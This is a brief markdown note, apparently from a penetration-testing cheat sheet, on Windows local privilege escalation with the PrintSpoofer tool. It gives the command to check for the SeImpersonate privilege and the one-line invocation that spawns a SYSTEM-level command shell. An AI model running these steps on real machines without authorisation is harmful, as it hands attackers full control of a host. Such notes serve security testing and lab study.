# Windows Privilege Escalation

## PrintSpoofer.exe
- Tested on Windows 10
- Uses Names Pipes and SeImpersonate to gain SYSTEM level priviledges - LPE
```bash
# Check for SeImpersonate
whoami /priv
# Execute LPE
PrintSpoofer.exe -i -c cmd
```
